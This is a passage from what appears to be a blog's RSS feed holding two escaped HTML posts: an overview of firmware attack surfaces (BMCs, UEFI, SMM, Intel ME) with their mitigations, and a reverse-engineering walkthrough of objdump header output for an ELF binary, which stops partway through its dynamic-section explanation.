      <description>&lt;h1 id=&#34;introduction&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*UA4-sPgJH7Fhk9jbvvRafQ.jpeg&#34; alt=&#34;https://www.istockphoto.com/photo/man-using-laptop-with-update-software-computer-program-upgrade-business-technology-gm1449779856-486876929&#34;  /&gt;

Introduction&lt;/h1&gt;
&lt;p&gt;Firmware is a critical component of electronic devices. It is the program that is installed on embedded systems that defines their functionality. Firmware is responsible for initializing the hardware components as the computer boots up, enabling the device to function properly.&lt;/p&gt;
&lt;p&gt;Attacks against firmware have been of increasing interest to hackers due to their relative ease to exploit in a world of increasingly more secure application- and network-layer security practices. Firmware security has been a frequently overlooked attack surface in cybersecurity that is now relatively unprotected in comparison to other attack vectors such as web applications or operating systems.&lt;/p&gt;
&lt;p&gt;In addition, security mitigations such as performing firmware updates are often more costly and inconvenient as they may require updating other software and firmware dependencies on the system, leading to more downtime. In some environments such as hospitals, firmware must pass very strict regulations which can increase the time it takes for updates. Compatibility between the firmware and hardware can result in an additional barrier for firmware updates.&lt;/p&gt;
&lt;h1 id=&#34;the-rise-of-firmwareattacks&#34;&gt;The Rise of Firmware Attacks&lt;/h1&gt;
&lt;p&gt;Firmware attacks are quickly becoming more common. According to &lt;a href=&#34;https://www.microsoft.com/en-us/security/blog/2021/03/30/new-security-signals-study-shows-firmware-attacks-on-the-rise-heres-how-microsoft-is-working-to-help-eliminate-this-entire-class-of-threats/&#34;&gt;Microsoft&lt;/a&gt;, 80% of organizations between the years 2019 and 2021 were victims to at least 1 firmware attack. In many cases, firmware is a single point of failure in the devices of organizations. The privileged nature of firmware allows for it to be abused by cybercriminals to access information such as cryptographic keys in memory, the BIOS/UEFI memory, network traffic, and potentially data from peripheral devices such as SSDs or webcams.&lt;/p&gt;
&lt;p&gt;These are some of the techniques used by adversaries once they have obtained firmware-level access:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Disable security settings such as Secure Boot (&lt;a href=&#34;https://thehackernews.com/2023/03/blacklotus-becomes-first-uefi-bootkit.html&#34;&gt;BlackLotus&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;Modify the boot record of the system to contain a bootkit&lt;/li&gt;
&lt;li&gt;Wipe the boot record resulting in a bricked system&lt;/li&gt;
&lt;li&gt;Arbitrarily read secrets and other sensitive data from memory&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;attack-surface&#34;&gt;Attack Surface&lt;/h1&gt;
&lt;p&gt;Attacking firmware can lead to extremely privileged access to a system. For instance, Baseboard Management Controllers (BMCs), Unified Extensible Firmware Interface (UEFI), System Management Mode (SMMs), or management subsystems on the CPU can each be compromised. This section will outline each component’s purpose, security risk, and mitigation techniques.&lt;/p&gt;
&lt;h2 id=&#34;bmcs&#34;&gt;BMCs&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*9hEnbp2Z7WCO9WKV&#34; alt=&#34;&#34;  /&gt;

Baseboard Management Controllers (BMCs) are hardware components that are often soldered into the motherboard of enterprise-grade servers. They may be assigned different names depending on the model that is used. For instance, Dell’s high end PowerEdge servers refer to the BMC as iDRAC (Dell Remote Access Controller) and HP has their infamous iLO (integrated Lights Out) which, as the name implies, provides out-of-band remote management services for the server that allow it to run in a lights out data center with minimal physical interaction.&lt;/p&gt;
&lt;p&gt;The role of BMCs is to allow remote management of the server. This includes power management, which is the ability to turn the server off and on, and the ability to configure UEFI settings. They often include a built-in keyboard video mouse (KVM) functionality that allows out-of-band access to the display of the server and allows for direct interaction with it through a keyboard and mouse.&lt;/p&gt;
&lt;p&gt;BMCs are highly privileged components that may be abused for&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Data theft and exfiltration&lt;/li&gt;
&lt;li&gt;Malware installation&lt;/li&gt;
&lt;li&gt;Disabling security features such as Secure Boot&lt;/li&gt;
&lt;li&gt;Physical damage to the system caused by sending it a signal that increases the voltage to the CPU causing it to overheat&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Another attack might include incessant rebooting of the system, rendering it temporarily useless and leading to a loss of availability.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;BMC attacks can be mitigated through the following techniques:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Establishing unique user accounts (if possible) and setting a strong password- ideally one that is in line with &lt;a href=&#34;https://pages.nist.gov/800-63-3/sp800-63b.html&#34;&gt;NIST’s password guidelines&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Enforcing secure network practices such as not exposing the BMC to the internet and implementing VLAN separation&lt;/li&gt;
&lt;li&gt;Use firmware scanning tools to verify the integrity of the firmware and catch security misconfigurations&lt;/li&gt;
&lt;li&gt;Monitoring BMC integrity through an established root of trust (RoT) such as a TPM or secure enclave in the CPU&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;uefibios&#34;&gt;UEFI/BIOS&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*B3RibWe5mxvLNeKh&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;Picture of a BIOS screen&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The Unified Extensible Firmware Interface (UEFI) is the modern and prevalent successor to the Basic Input Output System (BIOS).&lt;/p&gt;
&lt;p&gt;With access to the UEFI, attackers can&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Wipe the UEFI — the resulting hardware would need to be sent back to the hardware to be flashed with the correct firmware again&lt;/li&gt;
&lt;li&gt;Firmware modification&lt;/li&gt;
&lt;li&gt;Bootkit installation&lt;/li&gt;
&lt;li&gt;Physical damage to the system&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;An infamous example of malware that attacks the UEFI is &lt;a href=&#34;https://thehackernews.com/2023/03/blacklotus-becomes-first-uefi-bootkit.html&#34;&gt;BlackLotus&lt;/a&gt;, a bootkit that abused &lt;a href=&#34;https://github.com/Wack0/CVE-2022-21894&#34;&gt;CVE-2022–21894&lt;/a&gt; to truncate the SecureBoot policy from memory via the Windows Boot Application, thereby fully bypassing the security measure. Malware with the level of access granted by the UEFI can result in expensive damages to enterprise systems.&lt;/p&gt;
&lt;h2 id=&#34;smms&#34;&gt;SMMs&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*J6wRzq-WjDenWZ3v.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2020/11/SMM-social-2.png&#34;&gt;https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2020/11/SMM-social-2.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The System Management Mode (&lt;a href=&#34;https://en.wikipedia.org/wiki/System_Management_Mode&#34;&gt;SMM&lt;/a&gt;) is a highly privileged operating mode that is often referred to as Ring -2. The primary benefit of SMM is that it offers a distinct processor environment that is meant for use by only the UEFI/BIOS. The SMM code is executed in its own isolated address space known as SMRAM that is inaccessible to other privilege levels. This isolation is enforced by firmware.&lt;/p&gt;
&lt;p&gt;When System Manager Interrupts (SMIs) are issued during runtime, they interrupt the current execution of the CPU and transfer control to the SMI Handler, which is a software routine stored in the firmware that is responsible for handling and processing these interrupts. SMIs are how the UEFI interacts with the SMM.&lt;/p&gt;
&lt;p&gt;SMMs can be abused to&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Implant rootkits and bootkits on a system&lt;/li&gt;
&lt;li&gt;Read sensitive data&lt;/li&gt;
&lt;li&gt;Maintain persistence and stealth&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Mitigations for SMM attacks can include keeping the firmware updated and using security mechanisms such as Data Execution Prevention (DEP) and Control-Flow Integrity (CFI) on compiled binaries to protect from memory-based attacks.&lt;/p&gt;
&lt;h2 id=&#34;management-subsystems&#34;&gt;Management Subsystems&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*5XuFmJUmVLjZnmpG&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://freundschafter.com/wp-content/uploads/2018/01/7254-f-4-bc8a6355cce759c3.png&#34;&gt;https://freundschafter.com/wp-content/uploads/2018/01/7254-f-4-bc8a6355cce759c3.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Intel’s &lt;a href=&#34;https://en.wikipedia.org/wiki/Intel_Management_Engine&#34;&gt;Management Engine&lt;/a&gt; (ME) or AMD’s &lt;a href=&#34;https://en.wikipedia.org/wiki/AMD_Secure_Technology&#34;&gt;Platform Security Processor&lt;/a&gt; (PSP) are standalone microcontroller components that allow for out-of-band, remote management of a computer. They are included in the chipsets of these CPUs and, as explained in &lt;a href=&#34;https://freundschafter.com/research/about-intel-management-engine-intel-me-intel-active-management-technlogy-iamt/&#34;&gt;this article&lt;/a&gt;, the ME of an Intel chip in particular has a separated connection from the internal Interconnect, means it has the capabilities to bypass other subsystems like TPM and SMBus.&lt;/p&gt;
&lt;p&gt;The ME contains the Intel Active Management Technology (AMT). The AMT provides the remote management and control capabilities for Intel-based computers and servers, even when the system is powered off or the operating system is not running. It is a service that is enabled by the hardware microcontroller that is referred to as the ME.&lt;/p&gt;
&lt;p&gt;Despite ME and BMCs having a similar functionality, BMCs are not implemented into the same variety and scale of devices as the management engine is. This can significantly increase the impact of an ME vulnerability.&lt;/p&gt;
&lt;p&gt;Well known vulnerabilities in the ME include &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2018-3627&#34;&gt;CVE-2018–3627&lt;/a&gt; and &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2020-8703&#34;&gt;CVE-2020–8703&lt;/a&gt; which can lead to arbitrary code execution and local privilege escalation respectively.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Keeping the software of the CPU updated is crucial for mitigation. The updates can contain patches for known security vulnerabilities on the ME of the chip. In particular, updating the CSME, AMT, I ISM, DAL and DAL Software can prevent vulnerabilities as well as securely configuring the management engine if possible.&lt;/p&gt;
&lt;h1 id=&#34;supply-chainattacks&#34;&gt;Supply Chain Attacks&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*3iEBRxmvxyY1JJnKj1V-Yw.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://www.enisa.europa.eu/news/enisa-news/understanding-the-increase-in-supply-chain-security-attacks/@@download/image/IncidentReporting-PR_423x300mm_01.png&#34;&gt;https://www.enisa.europa.eu/news/enisa-news/understanding-the-increase-in-supply-chain-security-attacks/@@download/image/IncidentReporting-PR_423x300mm_01.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Attacking the supply chain can involve tampering with the firmware or hardware at any stage in the supply chain including development, manufacturing, distribution, and updating or patching the system. The result can be widely distributed malware affecting countless systems.&lt;/p&gt;
&lt;p&gt;In addition to the aforementioned tampering, firmware often uses 3rd-party dependencies (e.g. &lt;a href=&#34;https://binarly.io/posts/OpenSSL_Usage_in_UEFI_Firmware_Exposes_Weakness_in_SBOMs/index.html&#34;&gt;OpenSSL&lt;/a&gt;) which can remain outdated even when included in the latest firmware version. The result is a discrepancy between the firmware and its dependencies which never received an update, despite having critical security vulnerabilities.&lt;/p&gt;
&lt;p&gt;One method used to manage supply chain dependencies is using a Software Bill of Materials (SBOM). This is a list of the software components that are implemented into a firmware component. The accuracy and integrity of these lists are crucial to ensure that the known vulnerabilities in the firmware’s dependencies can be identified. There are also commercial solutions that monitor the firmware’s activity and integrity in order to raise alerts when suspicious hallmarks of infected firmware are detected.&lt;/p&gt;
&lt;h1 id=&#34;malware-attacks&#34;&gt;Malware Attacks&lt;/h1&gt;
&lt;p&gt;Another way that firmware can be exploited is through a system that has already been infected. This may happen through social engineering, executing a malicious program, exploiting vulnerabilities in externally facing service, drive-by attacks, and other initial access methods identified by the &lt;a href=&#34;https://attack.mitre.org/&#34;&gt;MITRE ATT&amp;amp;CK framework&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;With this attack type, the malicious actor or malware will attempt to elevate their privileges to the highest possible level and use tools such as &lt;a href=&#34;http://rweverything.com/&#34;&gt;RWEverything&lt;/a&gt; to write to the drivers and firmware. Through this approach, attackers are still able to obtain the privileged access of and stealth granted through firmware-level access.&lt;/p&gt;
&lt;h1 id=&#34;firmware-attacks-in-thewild&#34;&gt;Firmware Attacks in the Wild&lt;/h1&gt;
&lt;p&gt;It has become increasingly more prevalent for adversaries to gain their initial foothold on a network through remote access products. In 2020 alone, &lt;a href=&#34;https://www.checkpoint.com/downloads/resources/cyber-security-report-2021.pdf&#34;&gt;Checkpoint’s annual&lt;/a&gt; cybersecurity report found a substantial increases ranging from 85% to 2,066% of attacks that exploit vulnerabilities in these products as shown in the image below.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Mx8XRA2YeI3His7r24yFuQ.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;Page 25 of Checkpoint’s 2021 cybersecurity report&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Many of these vulnerabilities are caused by insecure firmware. Examples of this in insecure VPN products are &lt;a href=&#34;https://www.bleepingcomputer.com/news/security/zyxel-warns-of-critical-vulnerabilities-in-firewall-and-vpn-devices/&#34;&gt;Zyxel&lt;/a&gt;’s &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2023-33009&#34;&gt;CVE-2023–33009&lt;/a&gt; and &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2023-33010&#34;&gt;CVE-2023–33010&lt;/a&gt; and Fortinet’s &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2023-27997&#34;&gt;CVE-2023–27997&lt;/a&gt;. Both are critical RCEs caused by a buffer overflow that can lead to unauthorized, highly privileged access to a device. This can then be abused to implant malware such as a bootkit or make other critical configuration changes to the system and to move laterally through the internal network.&lt;/p&gt;
&lt;h1 id=&#34;mitigations&#34;&gt;Mitigations&lt;/h1&gt;
&lt;h2 id=&#34;security-platforms&#34;&gt;Security Platforms&lt;/h2&gt;
&lt;p&gt;Firmware security platforms such as those offered by &lt;a href=&#34;https://binarly.io/&#34;&gt;Binarly&lt;/a&gt; and &lt;a href=&#34;https://eclypsium.com/&#34;&gt;Eclypsium&lt;/a&gt; can help to detect and mitigate firmware misconfigurations and vulnerabilities. Binarly relies primarily on AI and deep code inspection to detect known and unknown vulnerabilities and misconfigurations in firmware. Eclypsium’s approach appears to incorporate both crytographic and heuristic verification of firmware with continuous monitoring, although the exact approach of both of these solutions is unknown.&lt;/p&gt;
&lt;p&gt;In addition, Lenovo launched their &lt;a href=&#34;https://techtoday.lenovo.com/us/en/solutions/thinkshield&#34;&gt;ThinkShield&lt;/a&gt; earlier this week, which is also powered by Eclypsium. A testament to the increase in availability of commercial solutions in firmware and supply chain security.&lt;/p&gt;
&lt;h2 id=&#34;code-signing&#34;&gt;Code Signing&lt;/h2&gt;
&lt;p&gt;Solutions that use cryptographic signatures to verify the integrity of code can also be used to mitigate supply chain attacks. Unforeseen malware being added to production code, for instance, can be prevented since the changes after the program was signed would be easier to detect.&lt;/p&gt;
&lt;p&gt;For instance, &lt;a href=&#34;https://www.sigstore.dev&#34;&gt;Sigstore&lt;/a&gt; is an open source project that at a high level uses Public Key Infrastructure (PKI) in order to validate the integrity of different modules in the supply chain to ensure that they were not tampered with. It does this by using a Sigstore client such as Cosign to request a public and private key from the certificate authority Fulcio. The private key that was obtained is used with Cosign to sign the file or image to be verified. After the artifact is signed, the signature of the file, its digest, and public key are stored in Rekor, an append-only transparency ledger that is viewable by the public. The private key is then deleted automatically, removing the need for key management. This system allows for developers, security professionals, and end users to verify that the file they have has not been tampered with.&lt;/p&gt;
&lt;p&gt;It is worth noting, however, that while code signing will verify integrity, it does not guarantee that the Software Bill of Materials (SBOM) is fully accurate in its content and completeness in closed-source projects. The security implication is potential lack of transparency on 3rd-party dependencies in these projects leading to unpatched security vulnerabilities in the system.&lt;/p&gt;
&lt;h1 id=&#34;initiatives&#34;&gt;Initiatives&lt;/h1&gt;
&lt;p&gt;While firmware attacks are on the rise, there is hope to be found in the initiatives that have been enacted in order to fortify this section of cybersecurity.&lt;/p&gt;
&lt;h2 id=&#34;increased-firmware-publications&#34;&gt;Increased Firmware Publications&lt;/h2&gt;
&lt;p&gt;There has been a rising awareness of firmware security that can be attributed largely to the increased amount of publications in circulation. These may include security best practices, vulnerability disclosures, or news articles.&lt;/p&gt;
&lt;p&gt;In June of this year, the Cybersecurity &amp;amp; Infrastructure Security Agency (CISA) and the National Security Agency (NSA) collaborated to create a guide for &lt;a href=&#34;https://media.defense.gov/2023/Jun/14/2003241405/-1/-1/0/CSI_HARDEN_BMCS.PDF&#34;&gt;hardening baseboard management controllers&lt;/a&gt;. This document outlined best practices for securing BMCs including many of the techniques that were mentioned previously in this article.&lt;/p&gt;
&lt;h2 id=&#34;ssith&#34;&gt;SSITH&lt;/h2&gt;
&lt;p&gt;In 2017, Defense Advanced Research Projects Agency (DARPA) created their System Security Integration Through Hardware and Firmware (&lt;a href=&#34;https://www.darpa.mil/program/ssith&#34;&gt;SSITH&lt;/a&gt;) program which takes a proactive approach to low-level security.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SSITH is focusing specifically on common classes of hardware weaknesses as identified by the MITRE Common Weakness Enumeration Specification (CWE) and NIST, including buffer errors; information leakage; resource management; numeric errors; injection; permissions, privileges, and access control; and hardware/system-on-chip implementation errors. Researchers are exploring a number of different approaches that go well beyond patching. These include using metadata tagging to detect unauthorized system access; utilizing context sensing pipelines to determine the intent of instructions; and employing formal methods to reason about integrated circuit systems and guarantee the accuracy of security characteristics.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.darpa.mil/program/ssith&#34;&gt;Dr. Lok Yan&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;Although it does have a predominant focus on hardware, SSITH still recognizes the role of firmware as an essential component in addressing security challenges and preventing exploit.&lt;/p&gt;
&lt;p&gt;SSITH appears to be an ongoing program whose effects have not yet been released publicly.&lt;/p&gt;
&lt;h2 id=&#34;secure-development-practices&#34;&gt;Secure Development Practices&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*h4xdnj8S3XpVFr8o.jpg&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://blog.gitguardian.com/content/images/2022/05/21W10-blog-content-stateOfReport-image2.jpg&#34;&gt;https://blog.gitguardian.com/content/images/2022/05/21W10-blog-content-stateOfReport-image2.jpg&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Cybersecurity has gradually become a significant part of the development process of both software and firmware. More companies are making the shift to a Secure Software Development Lifecycle (SSDLC). With this model, security is a consideration from the conception of a program to its release.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;With firmware attacks on the rise and an increased reliance on digital devices, securing systems is an important step of preventing critical cyberattacks. Modern commercial solutions can help to monitor firmware configurations, activity, and supply chain vulnerabilities and the trend towards secure development and education can help to decrease the amount of vulnerabilities that are in the firmware to begin with. In spite of this, firmware will likely never reach a point of having zero vulnerabilities. Maintaining regular updates and continuous education on the latest research is imperative in safeguarding our digital ecosystems, fortifying devices against emerging threats, and fostering a resilient foundation for a secure and trustworthy technological future.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Reverse Engineering — Analyzing Headers</title>
      <link>http://localhost:1313/ally-petitt/posts/2023-07-13_reverse-engineering---analyzing-headers-23dc84075cd/</link>
      <pubDate>Thu, 13 Jul 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2023-07-13_reverse-engineering---analyzing-headers-23dc84075cd/</guid>
      <description>&lt;p&gt;&lt;code&gt;objdump&lt;/code&gt; is a command line tool that can be used to gain insight into an executable binary. In this article, the tool will be used to dump all of the headers of the ELF binary &lt;code&gt;heapedit&lt;/code&gt; with the command below. Then, we will analyze and explain each section of output from the top to the bottom.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;objdump -x ./heapedit
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Executable and Linkable Format (ELF) files are a common file format for object files, executable binaries, core dumps, and shared libraries. It provides a standardized format for storing executable and object code, symbol information, and other metadata necessary for proper software execution. It may be helpful to first get an overview of an ELF file structure which can be seen in this image:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*1ro_BkQGlcyGrJmG.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://upload.wikimedia.org/wikipedia/commons/e/e4/ELF_Executable_and_Linkable_Format_diagram_by_Ange_Albertini.png&#34;&gt;https://upload.wikimedia.org/wikipedia/commons/e/e4/ELF_Executable_and_Linkable_Format_diagram_by_Ange_Albertini.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;file-header&#34;&gt;File Header&lt;/h2&gt;
&lt;p&gt;The first segment of output displays information from the file header including its file format, architecture, and flags. I’ll sequentially describe what each section means.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;heapedit: file format elf64-x86-64  
heapedit  
architecture: i386:x86-64, flags 0x00000112:  
EXEC\_P, HAS\_SYMS, D\_PAGED  
start address 0x0000000000400720
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;file format-&lt;/strong&gt; &lt;code&gt;elf64-x86–64&lt;/code&gt; refers to an ELF file that was designed for 64-bit systems and compiled for the x86–64 architecture.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;architecture&lt;/strong&gt;- The architecture &lt;code&gt;i386:x86–64&lt;/code&gt; indicates that the program is compatible with the i386 and x86–64 architecture.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;flags 0x00000112&lt;/strong&gt;- These flags are Binary File Descriptors (&lt;a href=&#34;https://sourceware.org/binutils/docs-2.23.1/bfd/index.html&#34;&gt;BFDs&lt;/a&gt;). They come from the &lt;code&gt;binutils&lt;/code&gt; package which is built into &lt;code&gt;objdump&lt;/code&gt; and their meaning can be found in the documentation &lt;a href=&#34;http://sourceware.org/binutils/docs-2.23.1/bfd/BFD-front-end.html#BFD-front-end&#34;&gt;here&lt;/a&gt;. In this example, &lt;code&gt;EXEC_P&lt;/code&gt; means the program is directly executable, &lt;code&gt;HAS_SYMS&lt;/code&gt; means that the program has a symbol table which helps with debugging, and &lt;code&gt;D_PAGED&lt;/code&gt; means that the program’s memory is dynamically paged.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;start address&lt;/strong&gt;- The memory address at which the &lt;code&gt;.text&lt;/code&gt; section begins, which contains the assembly code of the program.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This information is obtained by analyzing the raw bytes at the beginning of the file. The specifications for which bits correspond with which pieces of information can be seen &lt;a href=&#34;https://en.wikipedia.org/wiki/Executable_and_Linkable_Format&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;program-headers&#34;&gt;Program Headers&lt;/h2&gt;
&lt;p&gt;The program header (Phdr) is a section that contains necessary information for executing the binary.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Program Header:  
 PHDR off 0x0000000000000040 vaddr 0x0000000000400040 paddr 0x0000000000400040 align 2**3  
 filesz 0x00000000000001f8 memsz 0x00000000000001f8 flags r--  
 INTERP off 0x0000000000000238 vaddr 0x0000000000400238 paddr 0x0000000000400238 align 2**0  
 filesz 0x000000000000001c memsz 0x000000000000001c flags r--  
 LOAD off 0x0000000000000000 vaddr 0x0000000000400000 paddr 0x0000000000400000 align 2**21  
 filesz 0x0000000000000c98 memsz 0x0000000000000c98 flags r-x  
 LOAD off 0x0000000000000e00 vaddr 0x0000000000600e00 paddr 0x0000000000600e00 align 2**21  
 filesz 0x0000000000000278 memsz 0x0000000000000288 flags rw-  
 DYNAMIC off 0x0000000000000e10 vaddr 0x0000000000600e10 paddr 0x0000000000600e10 align 2**3  
 filesz 0x00000000000001e0 memsz 0x00000000000001e0 flags rw-  
 NOTE off 0x0000000000000254 vaddr 0x0000000000400254 paddr 0x0000000000400254 align 2**2  
 filesz 0x0000000000000044 memsz 0x0000000000000044 flags r--  
EH\_FRAME off 0x0000000000000b58 vaddr 0x0000000000400b58 paddr 0x0000000000400b58 align 2**2  
 filesz 0x000000000000003c memsz 0x000000000000003c flags r--  
 STACK off 0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**4  
 filesz 0x0000000000000000 memsz 0x0000000000000000 flags rw-  
 RELRO off 0x0000000000000e00 vaddr 0x0000000000600e00 paddr 0x0000000000600e00 align 2**0  
 filesz 0x0000000000000200 memsz 0x0000000000000200 flags r--
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Referencing the EL&lt;a href=&#34;https://man7.org/linux/man-pages/man5/elf.5.html&#34;&gt;F man page&lt;/a&gt;, the paraphrased meaning of the different program types (PTs) are below.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;PHDR&lt;/strong&gt;- specifies the location and size of the program header table itself.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;INTERP&lt;/strong&gt;- specifies the location and size of the program interpreter (dynamic linker) path.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;LOAD&lt;/strong&gt;- specifies the location and size of a loadable segment in the binary.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DYNAMIC&lt;/strong&gt;- specifies the location and size of the dynamic linking information.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: specifies the location and size of the ELF note segment (ElfN_Nhdr).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;EH_FRAME&lt;/strong&gt;: specifies the location and size of the exception handling frame information.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;STACK&lt;/strong&gt;: represents the stack segment, but in this case, it has a size of 0, indicating that it doesn’t occupy any space in the binary.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;RELRO&lt;/strong&gt;: specifies the location and size of the Relocation Read-Only (RELRO) area.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Each program type has its corresponding attributes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;off&lt;/strong&gt;- offset from beginning of file to first byte of the segment&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;vaddr&lt;/strong&gt;- the virtual address that the first byte of the segment resides in memory&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;paddr&lt;/strong&gt;- the physical memory address of the first byte of the segment if relevant&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;filesz&lt;/strong&gt;- holds the number of bytes of the file image of the segment&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;memsz&lt;/strong&gt;- holds the number of bytes of the memory image of hte segment&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;flags&lt;/strong&gt;- holds a bitmask of flags describing the read, write, and execute permissions of the segment.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;align&lt;/strong&gt;- specifies the desired alignment of the segment or section in memory. It indicates the power of two that should be used as the alignment constraint.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This table gives an overview of the different sections in memory and where they can be found.&lt;/p&gt;
&lt;h2 id=&#34;dynamic-section&#34;&gt;Dynamic Section&lt;/h2&gt;
&lt;p&gt;This section contains information about the dynamic linking and runtime symbol resolution of the program. This allows for external libraries to be loaded from disk into memory during the execution of the program.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Dynamic Section:  
 NEEDED libc.so.6  
 RUNPATH ./  
 INIT 0x0000000000400650  
 FINI 0x0000000000400af4  
 INIT\_ARRAY 0x0000000000600e00  
 INIT\_ARRAYSZ 0x0000000000000008  
 FINI\_ARRAY 0x0000000000600e08  
 FINI\_ARRAYSZ 0x0000000000000008  
 GNU\_HASH 0x0000000000400298  
 STRTAB 0x0000000000400410  
 SYMTAB 0x00000000004002c0  
 STRSZ 0x00000000000000a8  
 SYMENT 0x0000000000000018  
 DEBUG 0x0000000000000000  
 PLTGOT 0x0000000000601000  
 PLTRELSZ 0x00000000000000f0  
 PLTREL 0x0000000000000007  
 JMPREL 0x0000000000400560  
 RELA 0x0000000000400518  
 RELASZ 0x0000000000000048  
 RELAENT 0x0000000000000018  
 VERNEED 0x00000000004004d8  
 VERNEEDNUM 0x0000000000000001  
 VERSYM 0x00000000004004b8
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this example, the file &lt;code&gt;libc.so.6&lt;/code&gt; needs to be dynamically linked to the program. The ELF man page defines the meaning of the categories on the left column. The right column contains the memory address to store the sections indicated by the left column.&lt;/p&gt;
&lt;p&gt;For example, the ELF man page defines &lt;code&gt;PLTGOT&lt;/code&gt;:&lt;/p&gt;
